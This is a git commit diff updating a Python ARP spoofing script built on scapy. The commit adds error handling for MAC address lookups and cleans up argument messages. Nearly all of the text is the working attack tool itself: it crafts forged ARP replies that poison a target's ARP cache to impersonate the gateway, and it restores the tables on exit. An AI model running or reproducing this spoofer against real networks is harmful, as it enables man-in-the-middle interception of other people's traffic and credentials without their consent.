c2857de8ae57b11e0909754ed2cce0cc44878e1b
apathy-codes <139901090+apathy-codes@users.noreply.github.com>
2023-07-18 17:25:17 -0400

    Update arp_spoofer.py
    Error handling fixes

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -4,37 +4,44 @@ import time
 
 def get_arguments():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-t", "--target", dest="target_ip", help="specifies the target IP")
-    parser.add_argument("-g", "--gateway", dest="spoof_ip", help="specifies the router/gateway")
+    parser.add_argument("-t", "--target", dest="target_ip", help="specify the target IP")
+    parser.add_argument("-g", "--gateway", dest="spoof_ip", help="specify the router/gateway")
     options = parser.parse_args()
     if not options.target_ip:
-        parser.error("Please specify a target ip address, use -t or --help for more info.")
+        parser.error("Please specify a target IP address using -t or --target.")
     if not options.spoof_ip:
-        parser.error("Please specify a gateway ip address, use -s or --help for more info.")
+        parser.error("Please specify a gateway IP address using -g or --gateway.")
     return options
-options = get_arguments()
+
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    attack_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(attack_packet, verbose=False)
+    if target_mac:
+        attack_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        scapy.send(attack_packet, verbose=False)
+    else:
+        print("Could not retrieve target MAC address.")
 
 def restore(destination, source):
     destination_mac = get_mac(destination)
     source_mac = get_mac(source)
-    packet = scapy.ARP(op=2, pdst=destination, hwdst=destination_mac, psrc=source, hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=False)
-
+    if destination_mac and source_mac:
+        packet = scapy.ARP(op=2, pdst=destination, hwdst=destination_mac, psrc=source, hwsrc=source_mac)
+        scapy.send(packet, count=4, verbose=False)
+    else:
+        print("Could not retrieve MAC addresses for restoration.")
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=str(ip))
-    broadcast = scapy.Ether(dst=str("ff:ff:ff:ff:ff:ff"))
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    answered_list, _ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
     if answered_list:
         return answered_list[0][1].hwsrc
     else:
-        print("No response for ARP request, ICMP disabled?")
+        print("No response for ARP request.")
+        return None
 
+options = get_arguments()
 sent_packet_count = 0
 try:
     while True:
@@ -46,4 +53,4 @@ try:
 except KeyboardInterrupt:
     restore(options.target_ip, options.spoof_ip)
     restore(options.spoof_ip, options.target_ip)
-    print("\n[-]Quitting, restoring ARP bindings..")
+    print("\n[-] Quitting, restoring ARP bindings..")
